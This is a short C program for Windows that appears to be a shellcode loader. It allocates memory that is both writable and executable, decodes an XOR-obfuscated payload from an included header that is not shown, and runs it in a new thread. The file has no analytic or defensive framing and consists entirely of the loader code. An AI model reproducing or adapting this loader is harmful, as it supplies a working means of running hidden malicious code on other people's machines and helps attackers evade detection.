#include <windows.h>
#include "../common/payload_xor.h"

int main() {
    void *exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    decode_payload(exec);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
